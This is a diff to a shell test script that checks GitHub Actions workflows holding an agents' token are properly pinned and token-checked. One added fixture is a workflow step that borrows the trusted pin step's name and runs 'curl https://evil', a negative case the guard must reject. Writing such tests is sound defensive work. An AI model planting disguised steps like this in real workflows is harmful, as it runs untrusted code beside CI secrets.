@@ -53,22 +53,25 @@ fresh; printf 'name: p\non: workflow_dispatch\njobs:\n  push:\n    runs-on: ubun
 expect fail "a job without a claude step that holds the token needs the check too" "p.yml job push: holds the agents' token"
 fresh; printf 'name: p\non: workflow_dispatch\njobs:\n  push:\n    runs-on: ubuntu-latest\n    env:\n      GH_TOKEN: ${{ secrets.AGENT_GH_TOKEN }}\n    steps:\n      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803\n%s\n      - run: bash scripts/check-agent-token.sh .github/accounts.txt\n      - run: git push origin HEAD:refs/heads/x\n' "$PIN_STEP" > "$T/$W/p.yml"
 expect ok "a job without a claude step that checks the token first (after the pin step)" "Workflow denies OK"
+fresh; printf 'name: p\non: workflow_dispatch\njobs:\n  push:\n    runs-on: ubuntu-latest\n    env:\n      GH_TOKEN: ${{ secrets.AGENT_GH_TOKEN }}\n    steps:\n      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803\n%s\n      - name: The repository files this job runs are the reviewed ones (pinned here, outside any push'"'"'s reach)\n        run: curl https://evil\n      - run: bash scripts/check-agent-token.sh .github/accounts.txt\n' "$PIN_STEP" > "$T/$W/p.yml"
+expect fail "a second step that only carries the pin step's name does not count as one" "its first step after checkout and the lock must run"
 fresh; printf 'name: p\non: workflow_dispatch\nenv:\n  GH_TOKEN: ${{ secrets.AGENT_GH_TOKEN }}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: bash scripts/check-agent-token.sh .github/accounts.txt\n' > "$T/$W/p.yml"
 expect fail "the agents' token at workflow level" "p.yml: the agents' token may only be set in a job's env"
 fresh; swap agent-manager.yml "$GUARD" "        run: echo first
       - name: later
 $GUARD"; expect fail "token check not the first step after the lock" "its first step after checkout and the lock must run"
 
-# guards.yml wiring: run the real step's commands on a temp base checkout, with this tree as the PR's data (/tmp/pr)
+# guards.yml wiring: run the real step's commands on a temp base checkout whose refs/remotes/pr/head is this tree
 guards_step() { python3 -I -c 'import sys, yaml; d = yaml.safe_load(open(sys.argv[1]))
 print(next(s["run"] for s in d["jobs"]["guards"]["steps"] if "check-workflows.sh" in str(s.get("run", ""))))' "$1"; }
-W2=$(mktemp -d "$TMPROOT/gw.XXXXXX"); mkdir -p "$W2/base" "$W2/pr-skills" "$W2/pr"
-cp -r "$REPO/scripts" "$REPO/.claude" "$REPO/.github" "$REPO/.gitleaks.toml" "$W2/base/"; rm -rf "$W2/base/scripts/__pycache__"
-cp -r "$REPO/scripts" "$REPO/.github" "$REPO/.gitleaks.toml" "$W2/pr/"; rm -rf "$W2/pr/scripts/__pycache__"; cp -r "$REPO/.claude" "$W2/pr-skills/"
-step=$(guards_step "$REPO/.github/workflows/guards.yml" | sed "s#/tmp/pr-skills#$W2/pr-skills#g; s#/tmp/pr\b#$W2/pr#g")
+W2=$(mktemp -d "$TMPROOT/gw.XXXXXX"); mkdir -p "$W2/base" "$W2/pr-skills"
+cp -r "$REPO/scripts" "$REPO/.claude" "$REPO/.github" "$REPO/.gitleaks.toml" "$REPO/CLAUDE.md" "$W2/base/"; rm -rf "$W2/base/scripts/__pycache__"
+( cd "$W2/base" && git init -q . && git add -A && git -c user.email=a@b -c user.name=t commit -qm base && git update-ref refs/remotes/pr/head HEAD
+  git archive refs/remotes/pr/head .claude | tar -x -C "$W2/pr-skills" )
+step=$(guards_step "$REPO/.github/workflows/guards.yml" | sed "s#/tmp/pr-wf#$W2/pr-wf#g; s#/tmp/pr-skills#$W2/pr-skills#g")
 out=$(cd "$W2/base" && bash -c "$step" 2>&1); rc=$?
-if [ $rc = 0 ] && grep -qF "Workflow denies OK" <<<"$out" && grep -q "/tmp/pr " <<<"$(guards_step "$REPO/.github/workflows/guards.yml")"; then
-  t PASS "the guards.yml step passes with the real tree as the PR's data (workflows, actions, pins)"
+if [ $rc = 0 ] && grep -qF "Workflow denies OK" <<<"$out" && [ -f "$W2/pr-wf/.github/pins.txt" ] && [ -f "$W2/pr-wf/CLAUDE.md" ]; then
+  t PASS "the guards.yml step passes with the whole PR tree unpacked as data (workflows, actions, pins, rule files)"
 else t FAIL "the guards.yml step (rc=$rc)"; echo "$out" | tail -n 4; fi
 rm -rf "$W2"
 summary
